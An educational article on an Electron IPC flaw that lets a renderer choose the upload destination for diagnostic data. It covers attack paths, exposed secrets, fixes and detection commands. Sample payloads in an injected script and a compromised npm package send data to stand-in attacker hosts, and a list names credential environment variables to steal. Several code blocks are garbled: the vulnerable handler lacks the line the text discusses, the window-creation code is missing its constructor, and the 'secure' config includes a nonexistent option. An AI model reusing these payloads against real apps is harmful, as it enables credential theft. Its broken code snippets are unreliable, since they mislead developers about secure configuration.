What Is a Computer Process?

Before we talk about the vulnerability itself, you need to understand what a process is — because this entire bug revolves around two processes that should not trust each other, but do.

When you open an application on your computer — say, a music player or a web browser — your operating system creates a process. A process is basically an isolated bubble in which a program runs. It has its own memory, its own permissions, and its own identity. The operating system manages all running processes and controls which ones can access which resources.

Think of your computer as an office building. Each process is a separate office with its own locked door. The office can do work inside, but to interact with another office or with the building's infrastructure (the file system, the internet, the printers), it must go through approved channels.

Why is this isolation important? Because if one process gets infected with malware or crashes, it should not automatically infect or crash every other process. The walls between processes are a core security feature of every modern operating system.

What Is a Desktop Application vs. a Web Application?

A web application lives on a server. When you open your browser and visit https://gmail.com, you are loading a web application. The actual program runs on Google's servers — your browser just shows you the interface. The browser intentionally restricts what that web page can do. It cannot read files from your hard drive, it cannot see your running processes, and it cannot talk directly to hardware. These are called browser sandboxing restrictions.

A desktop application is different. It is installed directly onto your computer. Programs like Microsoft Word, Photoshop, or Discord are desktop applications. They run with your user account's permissions, which means they can read and write files, use the microphone and camera, manage network connections, and much more.

This power is a double-edged sword. Desktop apps are more capable, but a security vulnerability in a desktop app can have far more severe consequences than one in a web app — because the attack surface includes everything your user account can touch.

What Is Electron and Why Does It Exist?

Electron is an open-source framework created by GitHub (now owned by Microsoft) that allows developers to build desktop applications using web technologies — HTML, CSS, and JavaScript — the same languages used to build websites.

Before Electron, building a desktop application that worked on Windows, macOS, and Linux required writing three entirely separate programs in different languages (C++, Swift/Objective-C, C# or Win32 APIs). This was expensive, time-consuming, and required specialised expertise.

Electron solved this by bundling two major components together into one runtime:

Chromium — the open-source browser engine behind Google Chrome. This provides the rendering engine, the JavaScript execution environment, and all the visual display capabilities.

Node.js — a JavaScript runtime that gives direct access to the operating system. Node.js can read files, make network requests, spawn child processes, access hardware, and much more.

By combining these two, Electron lets JavaScript code do both jobs: run a beautiful visual interface (through Chromium) AND do powerful operating system operations (through Node.js). Developers write one codebase in JavaScript and it produces an application that works everywhere.

How Electron Structures an Application - The Two-Process Architecture

Electron splits every application into exactly two types of execution environments. Understanding these is fundamental to understanding this vulnerability.

The Renderer Process - The Visual Layer

The Renderer Process is responsible for everything you see. Every window in an Electron application has its own renderer process. The renderer runs inside a sandboxed Chromium environment — essentially a glorified browser tab.

What the renderer CAN do by default:

  • Display HTML and CSS
  • Run JavaScript that manipulates the user interface
  • Handle user interactions (button clicks, text input, etc.)
  • Display images, videos, and other media

What the renderer CANNOT do by default (and for good reason):

  • Directly access the file system
  • Make arbitrary network connections to any server
  • Read running processes
  • Execute system commands
  • Access low-level operating system features

This restriction exists because the renderer is the part of the application most likely to process untrusted external data — content from the internet, user-provided input, third-party plugin output. By keeping it sandboxed, even if someone manages to run malicious code inside the renderer, the damage they can do is limited.

The renderer is roughly equivalent to a regular web page in a browser. It is a display and interaction engine, not a power engine.

The Main Process - The Privileged Engine

The Main Process is the heart of the application. There is exactly one main process per Electron application. It runs with full Node.js access, which means full operating system access.

What the main process CAN do:

  • Read and write any file the user has permission to access
  • Make network requests to any server on the internet
  • Spawn child processes and run system commands
  • Access databases and application storage
  • Manage all application windows
  • Access native OS features (notifications, tray icons, system menus)
  • Read environment variables, process lists, system information
  • Interface with hardware (Bluetooth, USB, etc.)

The main process is extremely powerful. It essentially has the same level of access as any desktop application installed on your machine. This is why the main process must be written with extreme care — a vulnerability here is equivalent to a vulnerability in any high-privilege desktop program.

Why Keeping Them Separate Matters

The separation between renderer and main process is not just an organisational choice — it is a security boundary. Electron's entire security model depends on this wall being solid.

The philosophy is: if an attacker compromises the renderer (the less trusted, externally-facing part), they should still be blocked from the main process (the trusted, powerful part). The security impact of a renderer compromise should be limited to whatever the sandboxed renderer is allowed to do — which is not much.

This philosophy is directly stated in Electron's official security documentation:

"The renderer process should always be treated as untrusted input."

The moment you violate this and let the renderer influence privileged operations in the main process without strict validation, you have demolished your security model.

What Is IPC - Inter-Process Communication?

Since the renderer and main process are separated and cannot directly access each other's memory or code, they need a defined, controlled way to communicate. This is called Inter-Process Communication, or IPC.

Electron implements IPC through two primary objects:

ipcMain — used in the main process. It listens for incoming messages from renderers.

ipcRenderer — used in the renderer process. It sends messages to the main process and can listen for replies.

The communication works like a message-passing system:

  1. Renderer calls ipcRenderer.invoke('some-channel', data) — "I'm sending a request called 'some-channel' with this data."
  2. The main process has a handler: ipcMain.handle('some-channel', (event, data) => { ... }) — "When I receive a message on 'some-channel', run this code."
  3. The handler does something (reads a file, makes a network request, etc.) and returns a result.
  4. The renderer receives the result.

This is intentionally designed to look a lot like calling a function — but across process boundaries, through a secure pipe managed by the OS.

The IPC Security Contract

The IPC system is only as secure as the validation you put around it. The channel itself is neutral — it just passes messages. The developer is responsible for:

  • Checking that the sender is who they claim to be
  • Validating that the message content is safe and expected
  • Ensuring that the action taken in response is limited in scope
  • Never allowing message content to dictate the target of privileged operations

When developers skip these validations — as happened in this vulnerable application — the IPC channel becomes a direct attack vector.

The following is a representative example of the vulnerable implementation. Real production code may vary in structure, naming, and language features, but this pattern captures exactly what was wrong.

The Vulnerable Main Process Handler

const fs = require('fs');
const path = require('path');
const https = require('https');
const { execSync } = require('child_process');
const archiver = require('archiver');

// It accepts an upload destination URL directly from the renderer
// without ANY validation whatsoever.

  // The renderer is untrusted. An attacker controlling the renderer
  // can set this to any URL they want.

  const fileBuffer = fs.readFileSync(archivePath);
  // ... HTTP POST to destination ...

What Makes This Code Dangerous

The single line const uploadDestination = params.destination; is the root of all evil here. The developer assigned an attacker-controllable value to a variable and then used that variable to dictate where sensitive data goes — without ever questioning its legitimacy.

The Attack Surface - All the Ways an Attacker Gets Code into the Renderer

For this vulnerability to be exploited, an attacker needs JavaScript running inside the renderer process. There are more attack paths than most developers realise.

Attack Path 1 - Cross-Site Scripting (XSS) via Loaded Web Content

If the Electron application loads any web content from the internet — articles, user posts, notifications, embedded pages, chat messages — and that content is rendered without proper sanitisation, an attacker can inject a malicious script.

Example Scenario: The application has a news feed that fetches and renders articles from an external API. An attacker compromises the article server (or finds a way to inject into the feed) and adds a script tag to one article's content.

<!-- Malicious content injected into an article body -->
<p>This is a regular-looking article.</p>
<script>
  // This runs inside the Electron renderer
  const { ipcRenderer } = require('electron');
  ipcRenderer.invoke('upload-diagnostics', {
    destination: 'https://attacker-controlled-server.com/exfil'
  });
</script>

If the app renders this content with nodeIntegration: true (which gives renderer scripts access to Node.js), and without a Content Security Policy, this executes immediately and silently.

Attack Path 2 - Compromised npm Dependency (Supply Chain Attack)

Modern JavaScript applications depend on hundreds or thousands of third-party packages via npm (Node Package Manager). These are libraries written by other developers that add functionality without the app developer having to write everything from scratch.

Any one of these dependencies can be compromised. This has happened to real, major packages:

  • event-stream (2018) — a popular npm package was compromised with a targeted backdoor
  • ua-parser-js (2021) — another popular package was temporarily hijacked
  • node-ipc (2022) — a maintainer intentionally added destructive code

If even one of the hundreds of packages your Electron app depends on is compromised, the attacker's code runs inside your renderer. From there, exploiting the insecure IPC handler is trivial.

Example Scenario: The app uses some-ui-library version 2.3.1. An attacker publishes some-ui-library version 2.3.2 with an added payload:

// Malicious code added to a compromised npm package
// This runs automatically when the package is imported
if (typeof ipcRenderer !== 'undefined') {
  // We're inside an Electron renderer
  setTimeout(() => {
    ipcRenderer.invoke('upload-diagnostics', {
      destination: 'https://data-collection.evil-domain.io/harvest'
    });
  }, 5000); // Wait 5 seconds to avoid immediate detection
}

Attack Path 3 - Man-in-the-Middle (MitM) via HTTP Content Loading

If the application loads any resources (scripts, HTML fragments, data) over unencrypted HTTP (rather than HTTPS), an attacker on the same network can intercept and modify that traffic before it reaches the app.

Example Scenario: The app fetches its initial configuration or update data over HTTP:

GET http://cdn.appvendor.com/config/latest.json

An attacker on the same Wi-Fi network intercepts this and returns a modified response that includes a script payload. The app loads it, the renderer executes it, and the IPC exploit runs.

Attack Path 4 - Malicious URL Loaded in a Webview

If the application uses Electron's <webview> tag or BrowserView to display external websites, and those websites can be influenced by an attacker (via URL manipulation, redirects, or the site itself being compromised), a script on that page can potentially communicate through IPC if nodeIntegration is enabled in the webview.

Attack Path 5 - Prototype Pollution Leading to IPC Abuse

Prototype pollution is a JavaScript-specific vulnerability where an attacker manipulates the prototype chain of JavaScript objects. In some configurations, this can lead to unexpected code execution in the renderer, which can then be leveraged to trigger the IPC handler.

What Data Can Be Stolen - Full Breakdown

The impact of this vulnerability goes far beyond "some system information was leaked." Here is a comprehensive breakdown of what can be collected and what an attacker can do with each piece.

Environment Variables - The Crown Jewels

process.env contains all environment variables set in the user's session. Modern development workflows heavily rely on environment variables to store secrets, and many users and developers have credentials sitting in their environment.

Common sensitive environment variables:

AWS_ACCESS_KEY_ID            → Full AWS access
AWS_SECRET_ACCESS_KEY        → Paired with above — full cloud infrastructure access
GITHUB_TOKEN                 → Access to GitHub repos, including private ones
GOOGLE_APPLICATION_CREDENTIALS → GCP service account — full Google Cloud access
DATABASE_URL                 → Direct database connection string with credentials
API_KEY                      → Generic API key — varies by application
OPENAI_API_KEY               → OpenAI credits and API usage
STRIPE_SECRET_KEY            → Financial payment processing access
SLACK_BOT_TOKEN              → Access to Slack workspace
NPM_TOKEN                    → npm package publishing rights
HEROKU_API_KEY               → Heroku deployment access
AZURE_CLIENT_SECRET          → Azure cloud access

A single stolen AWS secret key can give an attacker access to entire cloud infrastructure — servers, databases, storage, emails — worth thousands of dollars per month in compute, and containing company-critical data.

Session and Authentication Data

If the application stores session tokens, OAuth access tokens, or authentication cookies in accessible locations (app storage, temp files, etc.), the main process can collect and exfiltrate these. With a valid session token:

  • The attacker does not need the user's password
  • They can impersonate the user in any service the token grants access to
  • Many tokens are long-lived (days, weeks, or months)
  • Two-factor authentication (2FA) does NOT protect against stolen tokens — the token was issued after 2FA was completed

Running Process List

Knowing what processes are running tells an attacker:

  • What security tools are installed (antivirus, EDR agents, monitoring tools) → allows evasion
  • What other applications are running → potential additional attack targets
  • What development tools are active → signals technical sophistication of the user
  • Internal company tool names → useful for targeted social engineering

Network Interface Information

os.networkInterfaces() provides:

  • All network adapters (Ethernet, Wi-Fi, VPN, virtual interfaces)
  • IP addresses (both IPv4 and IPv6)
  • MAC addresses (hardware addresses unique to network cards)
  • Subnet information

This is valuable for network reconnaissance. MAC addresses can be used to track physical devices. Internal IP ranges reveal corporate network architecture.

System Logs

System event logs (Windows Event Log, macOS syslog, Linux journalctl) contain:

  • Recent login and logout events
  • Failed authentication attempts
  • Application error messages (may contain sensitive data in stack traces)
  • Network connection records
  • Security policy changes
  • Scheduled task history

User Information

os.userInfo() provides:

  • Username (login name)
  • User ID and Group ID
  • Home directory path
  • Default shell

This is useful for targeted attacks. Knowing the username allows crafting more convincing phishing or social engineering attacks.

The Proxy Abuse Dimension

One subtle but important aspect of this vulnerability is that the exfiltrated data leaves the victim's machine from a trusted, legitimate application — not from suspicious software or an unknown process.

From the perspective of a corporate firewall or network monitoring tool, the outbound connection looks like:

[Legitimate Electron Application] → HTTPS POST → [attacker-server.com]

Not:

[Unknown Malware Process] → Connection → [attacker-server.com]

This makes detection significantly harder. Many corporate security tools whitelist known applications or at minimum flag unknown processes more aggressively. The attacker is hiding behind the app's legitimacy.

PART FOUR - ROOT CAUSE AND SECURE DESIGN

Why Developers Make This Mistake

Understanding why this vulnerability gets introduced helps prevent it in the future.

Optimism Bias in Development

Developers writing application code are focused on making things work correctly for legitimate users. They write the happy path: "A user clicks 'Send Diagnostics', the app uploads the data, success." They are not thinking: "What if the URL in this message was injected by an attacker?"

This optimism bias — assuming that code will only ever be used as intended — is the single most common cause of security vulnerabilities.

IPC Looks Like a Function Call

The IPC API is designed to feel like calling a regular function. ipcRenderer.invoke('upload-diagnostics', params) looks almost identical to calling a local function uploadDiagnostics(params). This familiar syntax makes it easy to forget that the two sides of this call are in completely different, differently-trusted execution environments.

Documentation and Security Training Gaps

Many Electron tutorials and starter templates do not emphasise security. Developers learning from these resources build habits around insecure patterns without realising it. Security is often treated as something to "add later" rather than a foundational design consideration.

The Principle of Least Privilege - A Deep Dive

The Principle of Least Privilege (PoLP) states that every component of a system should have access to exactly what it needs to do its job — and absolutely nothing more.

Applied to this vulnerability:

The renderer process needed to tell the main process: "please send diagnostic data." That is it. The renderer had ZERO legitimate need to know or specify WHERE that data goes. The destination is a configuration concern — it should live in the main process configuration, hardcoded or loaded from a trusted config file at startup.

By allowing the renderer to supply the destination, the developers granted the renderer far more influence over a privileged operation than it needed. This is a direct violation of PoLP.

Think of it this way: if you are a hospital administrator, and you instruct an orderly to deliver medical records somewhere, the orderly does not get to decide the destination based on what a patient wrote on a note and handed them. The destination is determined by the hospital's secure, internal routing procedures — completely out of the patient's hands.

PART FIVE - MITIGATION AND SECURE IMPLEMENTATION

Fix 1 - Remove Renderer Control Over Destination

This is the most important fix. The destination URL should NEVER come from the renderer. Period.

Insecure (What NOT to do):

// ❌ WRONG — Renderer controls the destination
ipcMain.handle('upload-diagnostics', async (event, params) => {
  const destination = params.destination; // ← Attacker controls this
  await uploadData(collectedData, destination);
});

Secure (What TO do):

// ✅ CORRECT — Destination is defined internally, renderer has no say
const DIAGNOSTICS_ENDPOINT = 'https://diagnostics.yourcompany.com/v1/upload';

ipcMain.handle('upload-diagnostics', async (event) => {
  // Note: no params from renderer are used for the destination
  const data = await collectDiagnosticData();
  await uploadData(data, DIAGNOSTICS_ENDPOINT); // ← Hardcoded trusted destination
  return { success: true };
});

Fix 2 - Implement Strict Allowlist Validation

If the application genuinely needs to support multiple destinations (e.g., different environments — dev, staging, production), use an allowlist — a whitelist of pre-approved values.

// ✅ SECURE ALLOWLIST PATTERN

const ALLOWED_DESTINATIONS = new Map([
  ['production',  'https://diagnostics.yourcompany.com/upload'],
  ['staging',     'https://staging-diagnostics.yourcompany.com/upload'],
  ['development', 'https://dev-diagnostics.localhost:8443/upload'],
]);

ipcMain.handle('upload-diagnostics', async (event, params) => {
  // Validate sender
  const senderURL = event.senderFrame.url;
  if (!senderURL.startsWith('file:///')) {
    throw new Error('IPC message rejected: untrusted sender origin');
  }

  // Validate the environment identifier against the allowlist
  const requestedEnv = params.environment;
  
  if (typeof requestedEnv !== 'string') {
    throw new Error('Invalid params: environment must be a string');
  }

  const destination = ALLOWED_DESTINATIONS.get(requestedEnv);
  
  if (!destination) {
    // Log the suspicious request
    console.warn(`[SECURITY] Rejected IPC request with unknown environment: ${requestedEnv}`);
    throw new Error(`Unknown environment: ${requestedEnv}`);
  }

  // Proceed with the trusted, pre-approved destination
  const data = await collectDiagnosticData();
  await uploadData(data, destination);
  return { success: true };
});

Notice that even in this pattern, the renderer only supplies an identifier string ('production'), not the actual URL. The main process maps that identifier to the URL internally.

Fix 3 - Validate the IPC Message Sender

Electron's IPC event object provides information about who sent the message. Use this to verify the message originated from a trusted frame.

// ✅ SENDER VALIDATION

ipcMain.handle('upload-diagnostics', async (event, params) => {
  // Get the URL of the frame that sent this IPC message
  const senderURL = event.senderFrame.url;

  // For local app pages, the URL starts with 'file:///'
  // For remote web content loaded via HTTPS, check the specific origin
  const isTrustedSender = 
    senderURL.startsWith('file:///') || 
    senderURL.startsWith('app://');  // Some Electron apps use custom protocols

  if (!isTrustedSender) {
    console.error(`[SECURITY ALERT] IPC message rejected from untrusted origin: ${senderURL}`);
    throw new Error('Security violation: IPC from untrusted sender');
  }

  // Continue with safe processing...
});

Fix 4 - Validate All Input Parameters with a Schema

Every IPC handler should validate the structure and content of incoming parameters before using them.

// ✅ SCHEMA VALIDATION USING A VALIDATION LIBRARY

const Joi = require('joi'); // Or use zod, yup, or manual checks

// Define the allowed shape of the params object
const diagnosticsParamsSchema = Joi.object({
  // Only allow specific known fields
  reportType: Joi.string().valid('crash', 'performance', 'general').required(),
  includeSystemInfo: Joi.boolean().default(true),
  // Explicitly REJECT any 'destination' field
  // (by not listing it, Joi will reject it in strict mode)
}).options({ allowUnknown: false, stripUnknown: false });

ipcMain.handle('upload-diagnostics', async (event, params) => {
  // Validate sender
  if (!isTrustedSender(event.senderFrame)) {
    throw new Error('Untrusted sender');
  }

  // Validate params
  const { error, value } = diagnosticsParamsSchema.validate(params);
  if (error) {
    console.warn(`[SECURITY] IPC params validation failed: ${error.message}`);
    throw new Error('Invalid parameters');
  }

  // Use validated params only
  const data = await collectDiagnosticData(value.reportType, value.includeSystemInfo);
  await uploadData(data, TRUSTED_ENDPOINT); // Always the hardcoded destination
  return { success: true };
});

Fix 5 - Enable All Electron Security Features

These settings should be the default for every Electron application. They are the security foundation that limits the blast radius of any renderer compromise.

// ✅ SECURE BROWSERWINDOW CONFIGURATION

const { BrowserWindow } = require('electron');

const mainWindow = new BrowserWindow({
  webPreferences: {
    // CRITICAL — Isolates the renderer's JS from Electron's APIs
    // Without this, the renderer can access ipcRenderer directly from window
    contextIsolation: true,

    // CRITICAL — Prevents renderer from using Node.js APIs
    // Even if contextIsolation is bypassed, nodeIntegration: false is a backup
    nodeIntegration: false,

    // Runs the renderer in a sandboxed process
    // Similar to how browser tabs are sandboxed
    sandbox: true,

    // Prevents loading insecure mixed content
    allowRunningInsecureContent: false,

    // Disables the ability to navigate to arbitrary URLs
    navigationDisable: true,

    // Only load the preload script you explicitly specify
    preload: path.join(__dirname, 'preload.js'),
  }
});

Fix 6 - Use a Secure Preload Script Pattern (contextBridge)

When contextIsolation: true, the renderer cannot call require('electron') directly. Instead, you expose only the specific, limited APIs the renderer needs through a contextBridge. This is the modern, secure Electron development pattern.

// preload.js — The secure bridge between renderer and main

const { contextBridge, ipcRenderer } = require('electron');

// Only expose the specific functions the renderer legitimately needs
// The renderer gets these clean, limited functions — nothing else
contextBridge.exposeInMainWorld('electronAPI', {
  
  // The renderer can ONLY call this function, with NO parameters
  // It cannot pass a destination URL — that's not an option
  uploadDiagnostics: () => ipcRenderer.invoke('upload-diagnostics'),

  // Another example: renderer can request to open a file, but cannot
  // specify arbitrary paths — only pre-approved operations
  openUserDataFolder: () => ipcRenderer.invoke('open-user-data-folder'),
});

// The renderer does NOT get access to the full ipcRenderer object
// It cannot call ipcRenderer.invoke with arbitrary channels or params

In the renderer:

// renderer.js — The secure renderer side

// The renderer can only do what the contextBridge exposes
// It does NOT have ipcRenderer, require(), or Node.js access

document.getElementById('sendDiagnosticsBtn').addEventListener('click', async () => {
  // ✅ This is the only way to trigger diagnostics — no URL parameter possible
  const result = await window.electronAPI.uploadDiagnostics();
  console.log('Result:', result);
});

// This would fail because ipcRenderer is not available in the renderer:
// const { ipcRenderer } = require('electron'); // ← ReferenceError: require is not defined

Fix 7 - Implement a Content Security Policy (CSP)

A Content Security Policy tells the browser/Chromium engine which sources of scripts, styles, and other resources are allowed to load. This is a critical defence against XSS attacks — even if someone injects a script tag, the CSP can prevent it from executing.

// In your main process, set a strict CSP for all loaded pages

const { session } = require('electron');

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  callback({
    responseHeaders: {
      ...details.responseHeaders,
      'Content-Security-Policy': [
        // Only allow scripts from the app itself (file:///)
        // No inline scripts, no external scripts
        "default-src 'self' file:; " +
        "script-src 'self' file:; " +
        "connect-src 'self' https://diagnostics.yourcompany.com; " +
        "img-src 'self' file: data:; " +
        "style-src 'self' file: 'unsafe-inline'; " +
        "object-src 'none'; " +
        "base-uri 'self'"
      ]
    }
  });
});

Fix 8 - Log, Monitor, and Alert on Suspicious IPC Patterns

Security controls are not just about prevention — they are also about detection. Implement logging so that suspicious IPC activity (like rejected requests with unknown destinations) triggers alerts.

// ✅ SECURITY LOGGING PATTERN

const securityLogger = require('./security-logger'); // Your logging implementation

ipcMain.handle('upload-diagnostics', async (event, params) => {
  
  // Log every invocation of privileged IPC handlers
  securityLogger.info({
    event: 'ipc_invocation',
    channel: 'upload-diagnostics',
    senderURL: event.senderFrame?.url,
    timestamp: new Date().toISOString(),
    paramsKeys: Object.keys(params || {}), // Log param keys but NOT values (avoid logging sensitive data)
  });

  // If validation fails, log it as a security event
  if (!isValidSender(event.senderFrame)) {
    securityLogger.warn({
      event: 'ipc_security_violation',
      reason: 'untrusted_sender',
      senderURL: event.senderFrame?.url,
      timestamp: new Date().toISOString(),
    });
    throw new Error('Security violation');
  }

  // Continue with secure processing...
});

Complete Secure Implementation - Putting It All Together

// main.js — FULLY SECURED IMPLEMENTATION

const { app, BrowserWindow, ipcMain, session } = require('electron');
const path = require('path');
const os = require('os');
const Joi = require('joi');

// ═══════════════════════════════════════════════════════════
// CONFIGURATION — All sensitive config lives here, in main
// ═══════════════════════════════════════════════════════════

const CONFIG = {
  diagnosticsEndpoint: 'https://diagnostics.yourcompany.com/v1/upload',
  trustedOrigins: ['file:///', 'app://'],
};

// ═══════════════════════════════════════════════════════════
// VALIDATION SCHEMA
// ═══════════════════════════════════════════════════════════

const diagnosticsSchema = Joi.object({
  reportType: Joi.string().valid('crash', 'performance', 'general').required(),
}).options({ allowUnknown: false });

// ═══════════════════════════════════════════════════════════
// SECURE IPC HANDLER
// ═══════════════════════════════════════════════════════════

ipcMain.handle('upload-diagnostics', async (event, params) => {
  
  // Step 1: Validate sender
  const senderURL = event.senderFrame?.url || '';
  const isTrusted = CONFIG.trustedOrigins.some(origin => senderURL.startsWith(origin));
  
  if (!isTrusted) {
    console.error(`[SECURITY] Rejected IPC from: ${senderURL}`);
    throw new Error('Untrusted IPC sender');
  }

  // Step 2: Validate params
  const { error, value } = diagnosticsSchema.validate(params);
  if (error) {
    console.warn(`[SECURITY] Invalid IPC params: ${error.message}`);
    throw new Error('Invalid parameters');
  }

  // Step 3: Collect data
  const diagnosticData = {
    platform: os.platform(),
    hostname: os.hostname(),
    appVersion: app.getVersion(),
    reportType: value.reportType,
    timestamp: new Date().toISOString(),
    // Note: NOT including process.env or other sensitive data unless necessary
    // Principle of least privilege: only collect what you genuinely need
  };

  // Step 4: Upload to HARDCODED, TRUSTED endpoint — never from renderer input
  await uploadDiagnostics(diagnosticData, CONFIG.diagnosticsEndpoint);

  return { success: true };
});

// ═══════════════════════════════════════════════════════════
// SECURE WINDOW CREATION
// ═══════════════════════════════════════════════════════════

function createWindow() {

    width: 1200,
    height: 800,
    webPreferences: {
      contextIsolation: true,      // ✅ Mandatory

      sandbox: true,                // ✅ Recommended
      preload: path.join(__dirname, 'preload.js'),
      allowRunningInsecureContent: false,
      webSecurity: true,
    }
  });

  // Apply CSP to all requests
  session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    callback({

PART SIX - DETECTION AND INDICATORS OF COMPROMISE

How to Detect If You Have Been Exploited

If you suspect this vulnerability has been exploited in a deployed application, here are the indicators to look for.

Network-Based Detection

Monitor outbound HTTPS connections from the application process. Legitimate applications typically connect to a small, known set of endpoints. An anomalous HTTPS POST request to an unfamiliar domain, especially one carrying a large payload, is suspicious.

# On Linux — monitor network connections from the app process
pid=$(pgrep -f "your-electron-app")
ss -tp | grep $pid

# Using Wireshark or tcpdump — capture app's traffic
sudo tcpdump -i any -w electron_traffic.pcap -f "pid $pid"

# On macOS — monitor with lsof
lsof -i -n -P | grep "your-electron-app"

Log-Based Detection

In the application's logs (if security logging was implemented), look for:

  • IPC invocations from unexpected sender origins
  • Failed validation attempts (suggesting someone probing the handler)
  • Unusual frequency of the upload-diagnostics channel being invoked

File System Detection

The vulnerable implementation writes a temporary archive before uploading it. Look for unexpected ZIP files in the application's temp directory:

# On Linux/macOS
find /tmp -name "diagnostics_*.zip" -newer /tmp -ls

# On Windows (PowerShell)
Get-ChildItem $env:TEMP -Filter "diagnostics_*.zip" | Select-Object Name, CreationTime, Length

Endpoint Detection and Response (EDR) Signals

Modern EDR tools should flag:

  • A non-browser application making an HTTPS connection to an uncategorised domain
  • A process spawning child processes (to collect system logs via execSync)
  • Large outbound data transfers from a desktop application

PART SEVEN - SUMMARY AND CONCLUSIONS

The Core Lesson

A single missing validation — checking whether the URL supplied in an IPC message is legitimate — transformed a feature (diagnostic upload) into a critical information disclosure vulnerability.

This is the nature of most real-world security vulnerabilities. They are not exotic or complex. They are moments where trust was assumed instead of verified, where a shortcut was taken, where "it works correctly" was conflated with "it is secure."

Security is not about making things work when users behave as expected. Security is about ensuring that nothing catastrophic happens when they do not.

Five Key Takeaways for Developers

1. Treat every IPC message as untrusted. It might not be from your own code. Validate sender, validate structure, validate content.

2. Never let the renderer control the destination of privileged operations. If the renderer does not need to know where data goes, do not tell it — and do not let it tell you.

3. Use the minimum permissions needed. If a feature can work without the renderer knowing a URL, design it that way. Remove options you do not need to offer.

4. Enable Electron's security features from day one. contextIsolation, nodeIntegration: false, sandbox. These are not optional extras — they are baseline requirements.

5. Security is a design activity, not a testing activity. These vulnerabilities are hard to add after the fact. Secure architecture decisions need to happen during design, not after deployment.
